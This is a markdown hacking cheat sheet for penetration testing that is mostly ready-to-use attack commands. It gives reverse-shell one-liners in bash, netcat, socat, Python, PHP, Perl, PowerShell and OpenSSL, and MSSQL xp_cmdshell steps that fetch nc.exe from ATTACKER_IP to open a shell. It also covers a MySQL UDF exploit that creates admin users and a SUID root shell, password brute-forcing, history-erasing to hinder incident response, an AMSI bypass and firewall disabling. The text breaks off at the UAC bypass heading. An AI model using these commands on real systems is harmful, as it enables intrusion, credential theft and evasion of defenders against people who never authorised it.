# 1. Hacking Cheatsheet

Commands and short scripts that accomplish useful things for hacking/red teaming.

Other great cheetsheets:
- [HackTricks](https://book.hacktricks.xyz/)
- [Red Team Experiments](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets)
- [Awesome Penetration Testing](https://github.com/enaqx/awesome-pentest)

# 2. Table of Contents
- [1. Hacking Cheatsheet](#1-hacking-cheatsheet)
- [2. Table of Contents](#2-table-of-contents)
- [3. Scanning](#3-scanning)
  - [3.1. Nmap Scanning](#31-nmap-scanning)
  - [3.2. Web Directory Scanning](#32-web-directory-scanning)
  - [3.3. SMB Enumeration](#33-smb-enumeration)
    - [3.3.1. Listing SMB Shares](#331-listing-smb-shares)
    - [3.3.2. Interacting on SMB](#332-interacting-on-smb)
  - [3.4. Kerberos Enumeration](#34-kerberos-enumeration)
  - [3.5. DNS Enumeration](#35-dns-enumeration)
    - [3.5.1. DNS Zone Transfer](#351-dns-zone-transfer)
    - [3.5.2. Bruteforcing DNS Records](#352-bruteforcing-dns-records)
  - [3.6. MySQL Enumeration](#36-mysql-enumeration)
    - [3.6.1. MySQL UDF Exploit](#361-mysql-udf-exploit)
    - [3.6.2. Grabbing MySQL Passwords](#362-grabbing-mysql-passwords)
    - [3.6.3. Useful MySQL Files](#363-useful-mysql-files)
  - [3.7. Microsoft SQL Server Enumeration](#37-microsoft-sql-server-enumeration)
    - [3.7.1. MS SQL Server Command Execution](#371-ms-sql-server-command-execution)
- [4. Exploitation](#4-exploitation)
  - [4.1. Searchsploit](#41-searchsploit)
  - [4.2. Password Bruteforcing](#42-password-bruteforcing)
    - [4.2.1. MS SQL Server Bruteforcing](#421-ms-sql-server-bruteforcing)
    - [4.2.2. SMB Bruteforcing](#422-smb-bruteforcing)
    - [4.2.3. SSH Bruteforcing](#423-ssh-bruteforcing)
    - [4.2.4. Web Form (HTTP POST) Bruteforcing](#424-web-form-http-post-bruteforcing)
    - [4.2.5. Zip File Bruteforcing](#425-zip-file-bruteforcing)
  - [4.3. Port Knocking](#43-port-knocking)
  - [4.4. Reverse Shells](#44-reverse-shells)
    - [4.4.1. Covering your tracks](#441-covering-your-tracks)
    - [4.4.2. Running a detached/daeminized process on Linux](#442-running-a-detacheddaeminized-process-on-linux)
    - [4.4.3. Netcat Listener](#443-netcat-listener)
    - [4.4.4. Socat Listener](#444-socat-listener)
    - [4.4.5. Bash Reverse Shell](#445-bash-reverse-shell)
    - [4.4.6. Netcat Reverse Shell](#446-netcat-reverse-shell)
    - [4.4.7. Socat Reverse Shell](#447-socat-reverse-shell)
    - [4.4.8. Python Reverse Shell](#448-python-reverse-shell)
    - [4.4.9. PHP Reverse Shell](#449-php-reverse-shell)
    - [4.4.10. Perl Reverse Shell](#4410-perl-reverse-shell)
    - [4.4.11. Powershell Reverse Shell](#4411-powershell-reverse-shell)
    - [4.4.12. OpenSSL Encrypted Reverse Shell](#4412-openssl-encrypted-reverse-shell)
  - [4.5. Encryption](#45-encryption)
    - [4.5.1. Create self-signed SSL/TLS certificate](#451-create-self-signed-ssltls-certificate)
- [5. Windows Privilege Escalation](#5-windows-privilege-escalation)
  - [5.1. Basic Windows Post-Exploit Enumeration](#51-basic-windows-post-exploit-enumeration)
  - [5.2. Using Saved Windows Credentials](#52-using-saved-windows-credentials)
  - [5.3. Check Windows File Permissions](#53-check-windows-file-permissions)
  - [5.4. Antivirus & Firewall Evasion](#54-antivirus--firewall-evasion)
    - [5.4.1. Windows AMSI Bypass](#541-windows-amsi-bypass)
    - [5.4.2. Turn off Windows Firewall](#542-turn-off-windows-firewall)
    - [5.4.3. Windows LOLBAS Encoding/Decoding](#543-windows-lolbas-encodingdecoding)
  - [5.5. Windows UAC Bypass](#55-windows-uac-bypass)
  - [5.6. Windows Pass-The-Hash](#56-windows-pass-the-hash)
  - [5.7. Windows Token Impersonation](#57-windows-token-impersonation)
    - [5.7.1. Windows Token Impersonation with RoguePotato](#571-windows-token-impersonation-with-roguepotato)
    - [5.7.2. Windows Token Impersonation with PrintSpoofer](#572-windows-token-impersonation-with-printspoofer)
    - [5.7.3. Windows Service Escalation - Registry](#573-windows-service-escalation---registry)
  - [5.8. Compiling Windows Binaries on Linux](#58-compiling-windows-binaries-on-linux)
  - [5.9. Miscellaneous Windows Commands](#59-miscellaneous-windows-commands)
- [6. Linux Privilege Escalation](#6-linux-privilege-escalation)
  - [6.1. Basic Linux Post-Exploit Enumeration](#61-basic-linux-post-exploit-enumeration)
  - [6.2. Watching for Linux Process Changes](#62-watching-for-linux-process-changes)
  - [6.3. Adding root user to /etc/shadow or /etc/passwd](#63-adding-root-user-to-etcshadow-or-etcpasswd)
  - [6.4. Escalating via sudo binaries](#64-escalating-via-sudo-binaries)
  - [6.5. LD_PRELOAD and LD_LIBRARY_PATH](#65-ld_preload-and-ld_library_path)
  - [6.6. SUID binaries](#66-suid-binaries)
  - [6.7. Using NFS for Privilege Escalation](#67-using-nfs-for-privilege-escalation)
- [7. Loot](#7-loot)
  - [7.1. Upgrading to Interactive Shell](#71-upgrading-to-interactive-shell)
  - [7.2. File Transfers](#72-file-transfers)
    - [7.2.1. Netcat transfer](#721-netcat-transfer)
    - [7.2.2. Curl transfers](#722-curl-transfers)
    - [7.2.3. PowerShell File Transfers](#723-powershell-file-transfers)
    - [7.2.4. Mount NFS Share](#724-mount-nfs-share)
    - [7.2.5. SMB Share](#725-smb-share)
    - [7.2.6. FTP Server on Kali](#726-ftp-server-on-kali)
    - [7.2.7. Windows LOLBAS File Downloads](#727-windows-lolbas-file-downloads)
    - [7.2.8. Windows Files of Interest](#728-windows-files-of-interest)
  - [7.3. Grabbing Passwords](#73-grabbing-passwords)
    - [7.3.1. Finding Windows Passwords](#731-finding-windows-passwords)
    - [7.3.2. Windows Passwords in Registry](#732-windows-passwords-in-registry)
    - [7.3.3. Files with Passwords on Windows](#733-files-with-passwords-on-windows)
    - [7.3.4. Getting Saved Wifi Passwords on Windows](#734-getting-saved-wifi-passwords-on-windows)
    - [7.3.5. Dumping Hashes from Windows](#735-dumping-hashes-from-windows)
      - [7.3.5.1. Dumping Hashes from Windows Domain Controller](#7351-dumping-hashes-from-windows-domain-controller)
    - [7.3.6. Pass The Hash Attacks on Windows](#736-pass-the-hash-attacks-on-windows)
- [8. Windows Persistence](#8-windows-persistence)
  - [8.1. Add RDP User](#81-add-rdp-user)
  - [8.2. Change Windows Domain Credentials](#82-change-windows-domain-credentials)
- [9. Linux Persistence](#9-linux-persistence)
- [10. Pivoting and Redirection](#10-pivoting-and-redirection)
  - [10.1. SSH Tunnels](#101-ssh-tunnels)
  - [10.2. Bending with iptables](#102-bending-with-iptables)
  - [10.3. Bending with socat](#103-bending-with-socat)
  - [10.4. Bending with rinetd](#104-bending-with-rinetd)
  - [10.5. Bending with netsh](#105-bending-with-netsh)

# 3. Scanning

## 3.1. Nmap Scanning

```sh
# preferred initial scan:
# verbose, no DNS resolution, default scripts/enumerate versions/detect OS/traceroute, output all formats
mkdir nmap; nmap -v -n -A -oA nmap/initial-scan VICTIM_IP

# all TCP ports, fast discovery, then script scan:
# verbose, no DNS resolution, fastest timing, all TCP ports, output all formats
ports=$(nmap -v -n -T4 --min-rate=1000 -p- VICTIM_IP | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -n -v -sC -sV -p $ports -oA nmap/tcp-all VICTIM_IP

# specifying safe and wildcard ftp-* scripts
nmap --script="safe and ftp-*" -v -n -p 21 -oA nmap/safe-ftp VICTIM_IP
```

## 3.2. Web Directory Scanning

```sh
# Gobuster
gobuster dir -u http://VICTIM_IP:8080 -a 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3831.6 Safari/537.36' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k -o gobuster/http-dlist-lower-small.txt
```

## 3.3. SMB Enumeration

Use `enum4linux` or `smbmap` to gather tons of basic info (users, groups,
shares, etc.)

```sh
# standard scan
enum4linux VICTIM_IP

# scan all the things
enum4linux -a VICTIM_IP
```

### 3.3.1. Listing SMB Shares

```sh
# List shares without creds
smbclient -N -L VICTIM_IP

# enumerate shares you have creds for (or ones that don't require creds)
smbclient -L VICTIM_IP -W DOMAIN -U svc-admin
```

### 3.3.2. Interacting on SMB

```sh
# Opens an interactive smb shell that you have creds for
smbclient '\\TARGET_IP\dirname' -W DOMAIN -U username

smb:\> help  # displays commands to use
smb:\> ls  # list files
smb:\> get filename.txt  # fetch a file
```

## 3.4. Kerberos Enumeration

```sh
# username enumeration with Kerbrute
./kerbrute userenum --dc DC_IP -d DOMAINNAME userlist.txt

# dump all LDAP users
impacket-GetADUsers -all -no-pass -dc-ip DC_IP DOMAIN.tld

# ASREPRoasting - Kerberos attack that allows password hashes to be retrieved
# for users that do not require pre-authentication (user has “Do not use
# Kerberos pre-authentication” enabled).
# Find ASREPRoastable users and password hashes (slash after domain required)
impacket-GetNPUsers -dc-ip DC_IP -usersfile found-users.txt DOMAIN.tld/
# be sure to crack the hashes to retrieve the passwords
hashcat -m 18200 /path/to/hashfile.txt /usr/share/wordlists/rockyou.txt --force

# alternate method (done locally on windows box):
# uses: https://github.com/GhostPack/Rubeus
Rubeus.exe asreproast /format:john /outfile:hash.txt

# List smb shares using username you just cracked the hash of
smbclient -L DC_IP -W DOMAIN.tld -U asreproasted-username
```

## 3.5. DNS Enumeration

**PRO TIP**: Make sure you add the DNS entries you discover to your
`/etc/hosts` file. Some web servers do redirection based on domain name!

```
10.10.10.10     victim.com mail.victim.com www.victim.com admin.victim.com
```

**General Purpose Enumeration**:

```sh
# dnsenum does full recon, including attempting zone transfers and bruteforcing
# specify "--noreverse" to avoid reverse-IP lookups
dnsenum domain.tld

# can also use dnsrecon, but takes a little more work to specify full enumeration
dnsrecon -a -s -b -y -k -w -d domain.tld

# fierce does a more abbreviated full-enumeration (good for preliminary look)
fierce --domain domain.tld
```

**Common record types**:

- `NS`: Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain.
- `A`: Also known as a host record, the "A record" contains the IP address of a hostname (such as www.example.com).
- `MX`: Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records.
- `PTR`: Pointer Records are used in reverse lookup zones and are used to find the records associated with an IP address.
- `CNAME`: Canonical Name Records are used to create aliases for other host records.
- `TXT`: Text records can contain any arbitrary data and can be used for various purposes, such as domain ownership verification.

### 3.5.1. DNS Zone Transfer

This is basically asking for a copy of all DNS entries served by an authoritative server.
It lets you get a list of other subdomains that might be of interest.
If a server is configured properly, it won't give you this info.

```sh
# using dnsrecon
dnsrecon -t axfr -d domain.tld

# using dig, note "@" before nameserver
dig @ns1.nameserver.tld axfr domain.tld

# using host (order of args matters)
host -l domain.tld ns1.nameserver.tld
```

### 3.5.2. Bruteforcing DNS Records

```sh
# using dnsrecon
dnsrecon -D /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t brt -d domain.tld

# specifying a file with dnsenum, also performs normal full enum
dnsenum --noreverse -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt domain.tld

# using nmap dns-brute script
nmap -vv -Pn -T4 -p 53 --script dns-brute domain.tld
```

## 3.6. MySQL Enumeration

MySQL listens on `TCP 3306` by default. You'll see it during a port scan or when
running `netstat -tnl`.

Logging in:

```sh
## Locally:
# as root without password (if allowed)
mysql -u root
# same, but prompt for password
mysql -u root -p

## Remotely:
mysql -h HOSTNAME -u root
```

Once logged in, check out the schema and environment:

```sql
-- show list of databases
show databases;
-- Set current database to mysql
use mysql;
-- show tables in current database
show tables;
-- describe the table schema for 'user' table
describe user;

-- show MySQL version (try 2nd cmd if first doesn't work)
select version();
select @@version;
-- show logged-in user
select user();
-- show active database
select database();
-- show system architecture
select @@version_compile_os, @@version_compile_machine;
show variables like '%compile%';
-- show plugin directory (for UDF exploit)
select @@plugin_dir;
show variables like 'plugin%';

-- Try to execute code (try all ways)
\! id
select sys_exec('id')
select do_system('id');

-- Try to read files
select load_file('/etc/passwd');
-- more complex method
create table if not exists test (entry TEXT);
load data local infile "/etc/passwd" into table test fields terminated by '\n';
select * from test;
-- show file privileges of 'test' user
select user,file_priv from mysql.user where user='test';
-- show all privs of current user
select * from mysql.user where user = substring_index(user(), '@', 1) ;

-- Look at passwords
-- MySQL 5.6 and below
select host, user, password from mysql.user;
-- MySQL 5.7 and above
select host, user, authentication_string from mysql.user;

-- add new user with full privileges
create user test identified by 'test';
grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to test identified by 'test' WITH GRANT OPTION;
-- show exact privileges
use information_schema; select grantee, table_schema, privilege_type from schema_privileges;
select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()';
```

### 3.6.1. MySQL UDF Exploit

Exploiting User-Defined Functions in MySQL to get shell execution. First,
ready the UDF library (provides `sys_exec` function) locally on the server.

Prerequisites:
- Write permission (INSERT) for the database’s "func" table
- FILE privileges to copy our library (shared object) to the plugin directory

```sh
# find sqlmap's copy of lib_mysqludf_sys.so (or dll)
locate lib_mysqludf_sys
# found in /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so
# copy the file into the server's /tmp/lib_mysqludf_sys.so for examples below
```

In MySQL terminal:

```sql
-- checking permissions
select * from mysql.user where user = substring_index(user(), '@', 1) ;
-- checking architecture
select @@version_compile_os, @@version_compile_machine;
-- or
show variables like '%compile%';
-- checking plugin directory (where to drop udf library)
select @@plugin_dir;
-- or
show variables like 'plugin%';

-- Linux
use mysql;
create table npn(line blob);
insert into npn values(load_file('/tmp/lib_mysqludf_sys.so'));
select * from npn into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
-- alternative: hex encode .so file and dump it directly:
select binary 0x<shellcode> into dumpfile '<plugin_dir>/lib_mysqludf_sys.so';
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
select sys_exec('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
-- then start local shell with `/tmp/rootbash -p` to get root

-- Windows
USE mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn values(load_files('C://temp//lib_mysqludf_sys.dll'));
SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
-- alternative: dump hex shellcode directly into file:
select binary 0x<shellcode> into dumpfile '<plugin_dir>/lib_mysqludf_sys.so';
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
SELECT sys_exec("net user hacker P@$$w0rd /add");
SELECT sys_exec("net localgroup Administrators hacker /add");
```

### 3.6.2. Grabbing MySQL Passwords

```sh
# contains plain-text password of the user debian-sys-maint
cat /etc/mysql/debian.cnf

# contains all the hashes of the MySQL users (same as what's in mysql.user table)
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```

### 3.6.3. Useful MySQL Files

- Configuration Files:
  - Windows
    - config.ini
    - my.ini
    - windows\my.ini
    - winnt\my.ini
    - INSTALL_DIR/mysql/data/
  - Unix
    - my.cnf
    - /etc/my.cnf
    - /etc/mysql/my.cnf
    - /var/lib/mysql/my.cnf
    - ~/.my.cnf
    - /etc/my.cnf
- Command History:
  - ~/.mysql.history
- Log Files:
  - connections.log
  - update.log
  - common.log

## 3.7. Microsoft SQL Server Enumeration

Microsoft SQL Server (default port TCP 1433) is a relational database management
system developed by Microsoft. It supports storing and retrieving data across
a network (including the Internet).

```sh
# if you know nothing about it, try 'sa' user w/o password:
nmap -v -n --script="safe and ms-sql-*" --script-args="mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER" -sV -p 1433 -oA nmap/safe-ms-sql VICTIM_IP
# if you don't have creds, you can try to guess them, but be careful not to block
# accounts with too many bad guesses
```

See [Password Bruteforcing](#42-password-bruteforcing) for more on cracking creds.

More great tips on [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)

### 3.7.1. MS SQL Server Command Execution

```sh
# Log in using service account creds if able
sqsh -S VICTIM_IP -U 'DOMAIN\USERNAME' -P PASSWORD [-D DATABASE]

# probably a simpler tool:
impacket-mssqlclient DOMAIN/USERNAME@VICTIM_IP -windows-auth
# requires double quotes for xp_cmdshell strings
```

```sql
-- Check if you have server admin rights to enable command execution:
SELECT IS_SRVROLEMEMBER('sysadmin')

-- turn on advanced options; needed to configure xp_cmdshell
sp_configure 'show advanced options', '1';
RECONFIGURE;

-- enable xp_cmdshell
sp_configure 'xp_cmdshell', '1';
RECONFIGURE;

-- Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami';
go;
-- can usually abbreviate to `xp_cmdshell "command"`

-- Get netcat reverse shell
xp_cmdshell 'powershell iwr -uri http://ATTACKER_IP/nc.exe -out c:\users\public\nc.exe'
go
xp_cmdshell 'c:\users\public\nc.exe -e cmd ATTACKER_IP 443'
go
```

# 4. Exploitation

## 4.1. Searchsploit

```sh
searchsploit -www query # show exploitdb link instead
searchsploit -x /path/to/exploit # read ("eXamine") the exploit file
searchsploit -m /path/to/exploit # mirror exploit file to current directory
```

## 4.2. Password Bruteforcing

### 4.2.1. MS SQL Server Bruteforcing

```sh
# Be carefull with the number of password in the list, this could lock-out accounts
# Use the NetBIOS name of the machine as domain, if needed
crackmapexec mssql VICTIM_IP -d DOMAINNAME -u usernames.txt -p passwords.txt
hydra -L /path/to/usernames.txt –P /path/to/passwords.txt VICTIM_IP mssql
medusa -h VICTIM_IP –U /path/to/usernames.txt –P /path/to/passwords.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=usernames.txt,passdb=passwords.txt,ms-sql-brute.brute-windows-accounts VICTIM_IP
```

### 4.2.2. SMB Bruteforcing

```sh
nmap --script smb-brute -p 445 VICTIM_IP
hydra -l Administrator -P passwords.txt VICTIM_IP smb -t 1
```

### 4.2.3. SSH Bruteforcing

```sh
# using hydra
# '-s PORT' contact service on non-default port
hydra -l username -P wordlist.txt ssh VICTIM_IP -s 2222

# using patator: useful when services (e.g. ssh) are too old for hydra to work
patator ssh_login host=VICTIM_IP port=2222 persistent=0 -x ignore:fgrep='failed' user=username password=FILE0 0=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt

ncrack -p 22 --user root -P passwords.txt VICTIM_IP [-T 5]
medusa -u root -P 500-worst-passwords.txt -h VICTIM_IP -M ssh
```

### 4.2.4. Web Form (HTTP POST) Bruteforcing

```sh
# using hydra
# string format "<webform-path>:<username-field>=^USER^&<password-field>=^PASS^:<bad-pass-marker>"
# '-l admin' means use only the 'admin' username. '-L userlist.txt' uses many usernames
# '-P wordlist.txt' means iterate through all passwords in wordlist. '-p password123' uses only that one.
# '-t 64': use 64 threads
# change to https-web-form for port 443
hydra -l admin -P ~/repos/SecLists/Passwords/Leaked-Databases/rockyou-50.txt VICTIM_IP_OR_DOMAIN http-post-form "/blog/admin.php:username=^USER^&password=^PASS^:Incorrect username" -t 64
```

### 4.2.5. Zip File Bruteforcing

```sh
# using fcrackzip
fcrackzip -D -p /usr/share/wordlists/rockyou.txt myplace.zip

# using john
zip2john myfile.zip > zipkey.john
john zipkey.john --wordlist=/usr/share/wordlists/rockyou.txt
```

## 4.3. Port Knocking

```sh
# port knock on ports 22->23->24 with nmap
# "-r" forces ports to be hit in order
# may want to add "--max-parallelism 1"
nmap -Pn --host-timeout 201 --max-retries 0 -r -p22,23,24 VICTIM_IP

# doing the same thing with netcat
# NOTE: netcat can only knock on sequential ports without using a for-loop
nc -z VICTIM_IP 22-24
```

## 4.4. Reverse Shells

- [Pentest Monkey Cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [Reverse Shell Generator](https://www.revshells.com/)

### 4.4.1. Covering your tracks

When you connect via a reverse/bind shell, your commands get saved in the
terminal history. To avoid logging this (to make incident response team's job
harder), use the following as your first command:

```sh
# for zsh, bash, sh, etc.
unset HISTFILE HISTSIZE HISTFILESIZE
```

```powershell
# for Windows PowerShell
Set-PSReadlineOption –HistorySaveStyle SaveNothing
# - or -
Remove-Module PSReadline
```

### 4.4.2. Running a detached/daeminized process on Linux

When delivering a payload, sometimes it needs to run as a daemon so it doesn't
die when the session/connection is closed. Normally you do this with `nohup`,
`detach`, `screen`, or `tmux`, but sometimes none of those binaries are available.
Still, you can accomplish creating a daemonized process by using sub-shells:

```sh
( ( while true; do echo "insert reverse shell cmd here"; sleep 5; done &) &)
```

### 4.4.3. Netcat Listener

```sh
nc -vlnp LISTEN_PORT
# on mac, exclude the "-p" flag
```

### 4.4.4. Socat Listener

```sh
# full tty over TCP
# "-d -d" prints fatal, error, warning, and notice messages
socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:LISTEN_PORT

# no tty, plaintext over TCP
socat -d -d TCP-LISTEN:LISTEN_PORT STDOUT

# full tty, encrypted with SSL (needs socat reverse shell using OPENSSL)
socat -d -d file:`tty`,raw,echo=0 OPENSSL-LISTEN:LISTEN_PORT,cert=mycert.pem,verify=0,fork
```

Note: to generate `mycert.pem` see [these instructions](#451-create-self-signed-ssltls-certificate)

### 4.4.5. Bash Reverse Shell

```sh
# only works on Linux
bash -i >& /dev/tcp/LISTEN_IP/LISTEN_PORT 0>&1
```

### 4.4.6. Netcat Reverse Shell

```sh
# if netcat has the -e flag:
nc -e /bin/sh 10.0.0.1 1234

# if no -e flag:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

### 4.4.7. Socat Reverse Shell

```sh
# with full tty
socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane TCP:LISTEN_IP:LISTEN_PORT

# no tty, text only
socat EXEC:/bin/bash TCP:LISTEN_IP:LISTEN_PORT

# full tty, encrypted with SSL (needs socat listener uing OPENSSL-LISTEN)
socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane OPENSSL:LISTEN_IP:LISTEN_PORT,verify=0
```

### 4.4.8. Python Reverse Shell

```sh
python -c 'import os,socket,pty;s=socket.create_connection(("LISTEN_IP",LISTEN_PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```


### 4.4.9. PHP Reverse Shell

```sh
# may have to try different socket numbers besides 3 (4,5,6...)
php -r '$sock=fsockopen("LISTEN_IP",LISTEN_PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### 4.4.10. Perl Reverse Shell

```sh
perl -e 'use Socket;$i="LISTEN_IP";$p=LIISTEN_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### 4.4.11. Powershell Reverse Shell

Invoke from `cmd` with `powershell -NoP -NonI -W Hidden -Exec Bypass -Command ...`

```powershell
New-Object System.Net.Sockets.TCPClient("LISTEN_IP",LISTEN_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### 4.4.12. OpenSSL Encrypted Reverse Shell

```sh
# generate key on server
openssl req -nodes -x509 -newkey rsa:2048 -days 365 -out cert.pem -keyout key.pem -batch
# Start server listener
openssl s_server -accept PORT -key key.pem -cert cert.pem

# Client-side reverse shell
rm -f /tmp/f; mkfifo /tmp/f && openssl s_client -connect SERVER_IP:PORT -quiet < /tmp/f 2>/dev/null | /bin/sh 2>&0 > /tmp/f &
```

## 4.5. Encryption

### 4.5.1. Create self-signed SSL/TLS certificate

```sh
# generate separate .key and .crt files
openssl req -newkey rsa:2048 -nodes -keyout mycert.key -x509 -days 365 -subj '/CN=example.com/O=Company Inc./C=UK' -out mycert.crt

# simpler method?
openssl req -new -x509 -nodes -out mycert.pem -keyout mycert.key -days 365

# convert .key/.cert to .pem file (easy way)
cat mycert.crt mycert.key > mycert.pem

# official way to convert combo of .key and .crt to .pem if needed:
openssl pkcs12 -export -in mycert.crt -inkey mycert.key -out mycert.p12
openssl pkcs12 -in mycert.p12 -nodes -out mycert.pem

# create client cert from ca.key
openssl req -x509 -new -nodes -key ca.key -sha256 -days 365 -out client.pem
openssl pkcs12 -export -in client.pem -inkey ca.key -out client.p12
```

# 5. Windows Privilege Escalation

## 5.1. Basic Windows Post-Exploit Enumeration

```bat
:: Basic System Info
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
hostname

:: Who am I?
echo %username%
whoami /all

:: Current User Domain
echo %userdomain%

:: What users/localgroups are on the machine?
net user
net localgroup

:: Who has admin privileges?
net localgroup Administrators

:: More info about a specific user. Check if user has privileges.
net user user1

:: View Domain Groups
net group /domain

:: View Members of Domain Group
net group /domain "Domain Administrators"

:: List saved credentials
cmdkey /list

:: Firewall
netsh firewall show state
netsh firewall show config

:: Network
ipconfig /all
route print
arp -a
netstat -ano

:: Hard disks
fsutil fsinfo drives

:: User environment
set

:: How well patched is the system?
wmic qfe get Caption,Description,HotFixID,InstalledOn

:: If both registry keys are set with DWORD values of 1, low-priv users can install *.msi files as NT AUTHORITY\SYSTEM
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: to pwn: msiexec /quiet /qn /i C:\Users\Public\revshell.msi

:: Does it have AutoRuns with weak permissions?
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

:: Check the powershell version
powershell $PSVersionTable.PSVersion
powershell (Get-Host).Version
powershell $host.Version

:: Can you control the registry of services?
powershell -c "Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl"
:: if NT AUTHORITY\INTERACTIVE has "FullContol", can pwn with:
:: [5.7.3. Windows Service Escalation - Registry](#573-windows-service-escalation---registry)

:: Can you put programs in the global startup folder?
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
:: look for (F), full access, or (W), write access
:: exploit by dropping reverse shell exe there, wait for admin to log in.

:: Files of interest (consider pulling for loot)
type %SYSTEMDRIVE%\boot.ini
type %WINDIR%\win.ini
type %WINDIR%\System32\drivers\etc\hosts

:: Scheduled Tasks
schtasks
:: more verbose list
schtasks /query /fo list /v

:: Services running
tasklist /svc
net start
sc queryex type= service state= active
:: List all services
powershell -c "get-service"
sc queryex type= service state= all
:: names only
sc queryex type= service state= all | find /i "SERVICE_NAME:"
:: Stopped services
sc queryex type= service state= inactive
:: Check a service's config settings (look for unquoted service path in BINARY_PATH_NAME)
sc qc SERVICENAME

:: Drivers
driverquery
:: Kernel Drivers (for exploit?)
driverquery | findstr Kernel
:: Filesystem drivers
driverquery | findstr "File System"

:: Processes
tasklist
powershell -c "get-process"
wmic process get processid,caption,executablepath,commandline,description

:: Installed Software
wmic product get name,version
powershell -c "Get-WmiObject -Class Win32_Product | Select-Object -Property Name,Version"
powershell -c "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize"

:: check if PowerShell logging is enabled
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
```

## 5.2. Using Saved Windows Credentials

```bat
:: List saved credentials
cmdkey /list
:: Run executable as 'admin' (assuming listed in cmdkey output)
runas /savecred /user:admin C:\Users\Public\revshell.exe
```

## 5.3. Check Windows File Permissions

```bat
:: Using accesschk from SysInternals Suite
:: checking file write permissions
accesschk.exe /accepteula -quvw c:\path\to\some\file.exe
:: checking registry key permissions
accesschk.exe /accepteula -quvwk c:\path\to\some\file.exe
:: checking service configuration change permissions
accesschk.exe /accepteula -quvwc SERVICENAME
:: if you have SERVICE_CHANGE_CONFIG permissions, exploit by changing binpath
:: e.g. sc config SERVICENAME binpath= "net localgroup administrators user /add"
```

## 5.4. Antivirus & Firewall Evasion

### 5.4.1. Windows AMSI Bypass

This one-liner lets you get past Windows' Antimalware Scan Interface (AMSI), which
will e.g. block malicious powershell scripts from running. If you get a warning
saying something like "This script contains malicious content and has been blocked
by your antivirus software", then run this command to disable that blocker.

```powershell
$a=[Ref].Assembly.GetTypes();foreach($b in $a){if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

### 5.4.2. Turn off Windows Firewall

```bat
netsh advfirewall set allprofiles state off
```

### 5.4.3. Windows LOLBAS Encoding/Decoding

```bat
:: base64 encode a file
certutil -encode inputFileName encodedOutputFileName
:: base64 decode a file
certutil -decode encodedInputFileName decodedOutputFileName
:: hex decode a file
certutil --decodehex encoded_hexadecimal_InputFileName
:: MD5 checksum
certutil.exe -hashfile somefile.txt MD5
```

## 5.5. Windows UAC Bypass

```powershell
# Ref: https://mobile.twitter.com/xxByte/status/1381978562643824644
